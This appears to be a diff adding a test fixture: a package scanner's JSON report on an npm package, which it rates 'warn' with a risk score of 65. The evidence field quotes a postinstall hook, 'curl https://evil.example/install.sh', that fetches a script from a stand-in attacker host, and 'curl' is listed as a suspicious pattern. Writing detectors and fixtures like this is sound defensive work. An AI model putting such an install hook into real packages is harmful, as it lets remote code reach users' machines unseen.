@@ -1,0 +1,89 @@
+{
+  "ecosystem": "npm",
+  "package": "postinstall-curl-example",
+  "version": "1.0.0",
+  "mode": "warn",
+  "decision": "warn",
+  "risk_score": 65,
+  "thresholds": {
+    "allow_max_score": 29,
+    "warn_max_score": 69,
+    "block_min_score": 70
+  },
+  "reasons": [
+    {
+      "rule_id": "lifecycle_script_present",
+      "severity": "medium",
+      "message": "Package defines a postinstall script",
+      "evidence": "postinstall=curl https://evil.example/install.sh",
+      "score": 20
+    },
+    {
+      "rule_id": "network_command_in_lifecycle",
+      "severity": "high",
+      "message": "Lifecycle script uses curl",
+      "evidence": "curl",
+      "score": 30
+    },
+    {
+      "rule_id": "missing_repository",
+      "severity": "low",
+      "message": "Package metadata does not include a source repository",
+      "score": 10
+    },
+    {
+      "rule_id": "missing_license",
+      "severity": "low",
+      "message": "Package metadata does not include a license",
+      "score": 5
+    }
+  ],
+  "recommended_action": "Review package before installing. Requested behavior analysis was not performed.",
+  "enforcement": "User review recommended",
+  "package_identity": {
+    "ecosystem": "npm",
+    "name": "postinstall-curl-example",
+    "version": "1.0.0"
+  },
+  "lifecycle_scripts": [
+    "postinstall"
+  ],
+  "suspicious_patterns": [
+    "curl"
+  ],
+  "behavior_analysis": {
+    "mode": "isolated",
+    "enabled": true,
+    "executed": false,
+    "isolated": true,
+    "runner": "isolated-unavailable",
+    "network_policy": "disabled",
+    "not_performed": true,
+    "reason": "isolated behavior analysis is currently supported only on Linux hosts with bubblewrap"
+  },
+  "artifact_analysis": {
+    "wheel_available": false,
+    "source_distribution_available": false,
+    "yanked": false,
+    "setup_py_present": false,
+    "native_extension": false
+  },
+  "policy": {
+    "source": "local",
+    "name": "default",
+    "version": "0.1.0",
+    "owner": "local"
+  },
+  "registry": {
+    "name": "local",
+    "type": "",
+    "url": "",
+    "auth_method": ""
+  },
+  "trust": {
+    "matched": false
+  },
+  "exception": {
+    "matched": false
+  }
+}
